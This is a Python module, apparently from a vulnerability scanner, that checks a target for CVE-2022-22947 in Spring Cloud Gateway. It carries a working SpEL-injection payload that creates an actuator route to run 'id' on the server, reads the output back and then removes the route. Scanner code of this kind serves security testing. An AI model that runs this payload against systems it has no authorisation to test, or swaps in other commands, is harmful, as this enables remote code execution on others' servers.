#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22947.py
   Description :
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
from json import JSONDecodeError
from utils.custom_headers import USER_AGENTS, TIMEOUT
from colorama import Fore
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

CVE_ID = "CVE-2022-22947"


def check(url, dns_domain, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22947漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    base_headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS)
    }
    json_headers = {**base_headers, 'Content-Type': 'application/json'}
    form_headers = {**base_headers, 'Content-Type': 'application/x-www-form-urlencoded'}

    payload = '''{\r
        "id": "hacktest",\r
        "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
        }],\r
        "uri": "http://example.com",\r
        "order": 0\r
    }'''
    target_url = url.strip("/")
    try:
        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=json_headers, data=payload, verify=False, timeout=TIMEOUT, proxies=proxies)
        if res1.status_code != 201:
            return False, {}
        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]", extra={"target": target_url})
        if res3.status_code == 200 and "uid=" in res3.text:
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": res3.url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": res3.url,
                "Details": f"检测到{CVE_ID}的RCE漏洞",
                "response": res3.json()
            }
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}
    except requests.RequestException as e:
        logger.debug(f"[Request Error：{e}]", extra={"target": url})
        return False, {}
    except JSONDecodeError as e:
        logger.error(f"[The response content is not in JSON format：{e}]", extra={"target": url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknow Error：{e}]", extra={"target": url})
        return False, {}


if __name__ == '__main__':
    is_vul, res = check("http://localhost:8083/", "", proxies={})
    print(is_vul, res)
